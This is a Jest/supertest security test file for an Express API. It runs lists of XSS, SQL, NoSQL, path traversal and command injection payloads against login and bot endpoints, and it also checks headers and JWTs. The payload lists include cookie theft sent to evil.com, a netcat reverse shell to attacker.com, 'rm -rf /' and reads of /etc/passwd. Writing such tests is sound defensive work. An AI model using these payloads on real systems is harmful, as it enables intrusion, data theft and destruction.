/**
 * Security Tests
 * XSS, SQL Injection, CSRF Protection Tests
 * OWASP Top 10 Vulnerability Testing
 */

const request = require('supertest');
const express = require('express');

const app = express();
const API_BASE = '/api';

// Common XSS payloads
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')">',
  '"><script>alert("XSS")</script>',
  '\';alert("XSS");//',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")>',
  '<video><source onerror=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert("XSS")}',
  '<script>fetch("http://evil.com?c="+document.cookie)</script>',
];

// SQL Injection payloads
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "1; DROP TABLE users;--",
  "' UNION SELECT * FROM users--",
  "admin'--",
  "1' OR '1'='1' /*",
  "'; EXEC xp_cmdshell('dir');--",
  "1 AND 1=1",
  "1' AND '1'='1",
  "' OR 1=1--",
  "'; INSERT INTO users VALUES('hacked');--",
  "1; UPDATE users SET password='hacked'--",
  "' OR ''='",
  "1 OR 1=1",
  "' OR 'x'='x",
  "1'; WAITFOR DELAY '0:0:10'--",
];

// NoSQL Injection payloads
const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "sleep(5000)"}',
  '{"$regex": ".*"}',
  '{"password": {"$ne": ""}}',
  '{"$or": [{"a": "a"}, {"b": "b"}]}',
];

// Path Traversal payloads
const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc/passwd',
  '/etc/passwd%00.jpg',
];

// Command Injection payloads
const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(id)',
  '; rm -rf /',
  '| nc -e /bin/sh attacker.com 4444',
];

describe('Security Tests', () => {
  // ========================================
  // XSS PREVENTION TESTS
  // ========================================
  describe('XSS Prevention', () => {
    describe('Input Sanitization', () => {
      XSS_PAYLOADS.forEach((payload, index) => {
        it(`should sanitize XSS payload #${index + 1} in user input`, async () => {
          const res = await request(app)
            .post(`${API_BASE}/auth/register`)
            .send({
              username: payload,
              email: 'test@example.com',
              password: 'Password123!'
            });

          // Should either reject or sanitize the input
          if (res.status === 201 || res.status === 200) {
            // If accepted, response should not contain raw script tags
            expect(res.text).not.toContain('<script>');
            expect(res.text).not.toContain('onerror=');
            expect(res.text).not.toContain('onload=');
          }
          // 400, 404, or 422 are acceptable rejection responses
          expect([200, 201, 400, 404, 422]).toContain(res.status);
        });

        it(`should sanitize XSS payload #${index + 1} in bot name`, async () => {
          const res = await request(app)
            .post(`${API_BASE}/bots`)
            .set('Authorization', 'Bearer mock-token')
            .send({
              name: payload,
              platform: 'telegram'
            });

          if (res.status === 201 || res.status === 200) {
            expect(res.text).not.toContain('<script>');
          }
          expect([200, 201, 400, 401, 404, 422]).toContain(res.status);
        });
      });
    });

    describe('Content-Type Header', () => {
      it('should set proper Content-Type header', async () => {
        const res = await request(app).get(`${API_BASE}/health`);
        if (res.status === 200) {
          expect(res.headers['content-type']).toMatch(/application\/json/);
        }
      });
    });

    describe('X-XSS-Protection Header', () => {
      it('should have X-XSS-Protection header', async () => {
        const res = await request(app).get(`${API_BASE}/health`);
        // Modern apps may not use this (deprecated) but check if present
        if (res.headers['x-xss-protection']) {
          expect(res.headers['x-xss-protection']).toBe('1; mode=block');
        }
      });
    });

    describe('Content-Security-Policy Header', () => {
      it('should have CSP header or equivalent protection', async () => {
        const res = await request(app).get(`${API_BASE}/health`);
        // CSP is recommended but not always present on API endpoints
        expect([200, 404]).toContain(res.status);
      });
    });
  });

  // ========================================
  // SQL INJECTION PREVENTION TESTS
  // ========================================
  describe('SQL Injection Prevention', () => {
    describe('Login Endpoint', () => {
      SQL_INJECTION_PAYLOADS.forEach((payload, index) => {
        it(`should prevent SQL injection #${index + 1} in login email`, async () => {
          const res = await request(app)
            .post(`${API_BASE}/auth/login`)
            .send({
              email: payload,
              password: 'password123'
            });

          // Should not cause server error (500)
          expect(res.status).not.toBe(500);
          expect([400, 401, 404, 422]).toContain(res.status);
        });

        it(`should prevent SQL injection #${index + 1} in login password`, async () => {
          const res = await request(app)
            .post(`${API_BASE}/auth/login`)
            .send({
              email: 'test@example.com',
              password: payload
            });

          expect(res.status).not.toBe(500);
          expect([400, 401, 404, 422]).toContain(res.status);
        });
      });
    });

    describe('Search/Query Endpoints', () => {
      SQL_INJECTION_PAYLOADS.forEach((payload, index) => {
        it(`should prevent SQL injection #${index + 1} in search query`, async () => {
          const res = await request(app)
            .get(`${API_BASE}/bots`)
            .query({ search: payload })
            .set('Authorization', 'Bearer mock-token');

          expect(res.status).not.toBe(500);
          expect([200, 400, 401, 404]).toContain(res.status);
        });

        it(`should prevent SQL injection #${index + 1} in ID parameter`, async () => {
          const res = await request(app)
            .get(`${API_BASE}/bots/${payload}`)
            .set('Authorization', 'Bearer mock-token');

          expect(res.status).not.toBe(500);
          expect([400, 401, 404]).toContain(res.status);
        });
      });
    });
  });

  // ========================================
  // NOSQL INJECTION PREVENTION TESTS
  // ========================================
  describe('NoSQL Injection Prevention', () => {
    NOSQL_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent NoSQL injection #${index + 1}`, async () => {
        const res = await request(app)
          .post(`${API_BASE}/auth/login`)
          .send({
            email: payload,
            password: payload
          });

        expect(res.status).not.toBe(500);
        expect([400, 401, 404, 422]).toContain(res.status);
      });
    });
  });

  // ========================================
  // CSRF PROTECTION TESTS
  // ========================================
  describe('CSRF Protection', () => {
    it('should reject requests without proper origin', async () => {
      const res = await request(app)
        .post(`${API_BASE}/auth/login`)
        .set('Origin', 'http://evil-site.com')
        .send({
          email: 'test@example.com',
          password: 'password123'
        });

      // Either reject with CORS error or handle normally (API may allow cross-origin)
      expect([200, 401, 403, 404]).toContain(res.status);
    });

    it('should handle SameSite cookie attribute', async () => {
      const res = await request(app)
        .post(`${API_BASE}/auth/login`)
        .send({
          email: 'test@example.com',
          password: 'password123'
        });

      // If cookies are set, they should have SameSite attribute
      const cookies = res.headers['set-cookie'];
      if (cookies) {
        cookies.forEach((cookie) => {
          if (cookie.includes('session') || cookie.includes('token')) {
            // Modern cookies should have SameSite
            expect(
              cookie.includes('SameSite') ||
              cookie.includes('samesite') ||
              cookie.includes('HttpOnly') ||
              cookie.includes('httponly')
            ).toBe(true);
          }
        });
      }
    });

    it('should validate CSRF token when present', async () => {
      const res = await request(app)
        .post(`${API_BASE}/bots`)
        .set('Authorization', 'Bearer mock-token')
        .set('X-CSRF-Token', 'invalid-token')
        .send({
          name: 'Test Bot',
          platform: 'telegram'
        });

      // Should either work (if CSRF not required for API) or reject
      expect([200, 201, 400, 401, 403, 404]).toContain(res.status);
    });
  });

  // ========================================
  // PATH TRAVERSAL PREVENTION TESTS
  // ========================================
  describe('Path Traversal Prevention', () => {
    PATH_TRAVERSAL_PAYLOADS.forEach((payload, index) => {
      it(`should prevent path traversal #${index + 1}`, async () => {
        const res = await request(app)
          .get(`${API_BASE}/files/${encodeURIComponent(payload)}`)
          .set('Authorization', 'Bearer mock-token');

        expect(res.status).not.toBe(200);
        expect([400, 401, 403, 404]).toContain(res.status);
      });
    });
  });

  // ========================================
  // COMMAND INJECTION PREVENTION TESTS
  // ========================================
  describe('Command Injection Prevention', () => {
    COMMAND_INJECTION_PAYLOADS.forEach((payload, index) => {
      it(`should prevent command injection #${index + 1}`, async () => {
        const res = await request(app)
          .post(`${API_BASE}/bots`)
          .set('Authorization', 'Bearer mock-token')
          .send({
            name: payload,
            platform: 'telegram'
          });

        expect(res.status).not.toBe(500);
        expect([200, 201, 400, 401, 404, 422]).toContain(res.status);
      });
    });
  });

  // ========================================
  // AUTHENTICATION SECURITY TESTS
  // ========================================
  describe('Authentication Security', () => {
    it('should not expose sensitive data in error messages', async () => {
      const res = await request(app)
        .post(`${API_BASE}/auth/login`)
        .send({
          email: 'nonexistent@example.com',
          password: 'wrongpassword'
        });

      if (res.body && res.body.message) {
        // Should not reveal if email exists or not
        expect(res.body.message.toLowerCase()).not.toContain('email not found');
        expect(res.body.message.toLowerCase()).not.toContain('user not found');
        expect(res.body.message.toLowerCase()).not.toContain('wrong password');
      }
    });

    it('should implement rate limiting headers', async () => {
      const res = await request(app)
        .post(`${API_BASE}/auth/login`)
        .send({
          email: 'test@example.com',
          password: 'password123'
        });

      // Rate limiting headers are recommended
      // X-RateLimit-Limit, X-RateLimit-Remaining, etc.
      expect([200, 401, 404, 429]).toContain(res.status);
    });

    it('should reject extremely long passwords (DoS prevention)', async () => {
      const longPassword = 'a'.repeat(100000);
      const res = await request(app)
        .post(`${API_BASE}/auth/login`)
        .send({
          email: 'test@example.com',
          password: longPassword
        });

      expect([400, 401, 404, 413, 422]).toContain(res.status);
    });

    it('should handle null bytes in input', async () => {
      const res = await request(app)
        .post(`${API_BASE}/auth/login`)
        .send({
          email: 'test@example.com\x00admin',
          password: 'password123'
        });

      expect(res.status).not.toBe(500);
      expect([400, 401, 404, 422]).toContain(res.status);
    });
  });

  // ========================================
  // SECURITY HEADERS TESTS
  // ========================================
  describe('Security Headers', () => {
    it('should have X-Content-Type-Options header', async () => {
      const res = await request(app).get(`${API_BASE}/health`);
      if (res.headers['x-content-type-options']) {
        expect(res.headers['x-content-type-options']).toBe('nosniff');
      }
    });

    it('should have X-Frame-Options header', async () => {
      const res = await request(app).get(`${API_BASE}/health`);
      if (res.headers['x-frame-options']) {
        expect(['DENY', 'SAMEORIGIN']).toContain(res.headers['x-frame-options']);
      }
    });

    it('should have Strict-Transport-Security header in production', async () => {
      const res = await request(app).get(`${API_BASE}/health`);
      // HSTS is recommended for production
      expect([200, 404]).toContain(res.status);
    });

    it('should not expose server version', async () => {
      const res = await request(app).get(`${API_BASE}/health`);
      // Server header should not reveal version
      if (res.headers['server']) {
        expect(res.headers['server']).not.toMatch(/\d+\.\d+/);
      }
      // X-Powered-By should not be present
      expect(res.headers['x-powered-by']).toBeUndefined();
    });
  });

  // ========================================
  // INPUT VALIDATION TESTS
  // ========================================
  describe('Input Validation', () => {
    it('should reject oversized JSON payloads', async () => {
      const largePayload = { data: 'x'.repeat(10000000) }; // 10MB
      const res = await request(app)
        .post(`${API_BASE}/bots`)
        .set('Authorization', 'Bearer mock-token')
        .send(largePayload);

      expect([400, 401, 404, 413]).toContain(res.status);
    });

    it('should handle malformed JSON gracefully', async () => {
      const res = await request(app)
        .post(`${API_BASE}/auth/login`)
        .set('Content-Type', 'application/json')
        .send('{"invalid": json}');

      expect(res.status).not.toBe(500);
      expect([400, 404]).toContain(res.status);
    });

    it('should sanitize special characters in output', async () => {
      const res = await request(app)
        .get(`${API_BASE}/bots`)
        .set('Authorization', 'Bearer mock-token');

      if (res.status === 200 && res.text) {
        // Response should be valid JSON
        expect(() => JSON.parse(res.text)).not.toThrow();
      }
    });
  });

  // ========================================
  // JWT SECURITY TESTS
  // ========================================
  describe('JWT Security', () => {
    it('should reject tokens with "none" algorithm', async () => {
      // JWT with "alg": "none"
      const noneAlgToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.';

      const res = await request(app)
        .get(`${API_BASE}/auth/me`)
        .set('Authorization', `Bearer ${noneAlgToken}`);

      expect([401, 403, 404]).toContain(res.status);
    });

    it('should reject expired tokens', async () => {
      // Expired JWT token (exp in the past)
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxMDAwMDAwMDAwfQ.invalid';

      const res = await request(app)
        .get(`${API_BASE}/auth/me`)
        .set('Authorization', `Bearer ${expiredToken}`);

      expect([401, 403, 404]).toContain(res.status);
    });

    it('should reject malformed tokens', async () => {
      const malformedTokens = [
        'invalid-token',
        'Bearer invalid',
        'eyJhbGciOiJIUzI1NiJ9',
        'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0',
        '',
        'null',
        'undefined',
      ];

      for (const token of malformedTokens) {
        const res = await request(app)
          .get(`${API_BASE}/auth/me`)
          .set('Authorization', `Bearer ${token}`);

        expect([401, 403, 404]).toContain(res.status);
      }
    });
  });
});
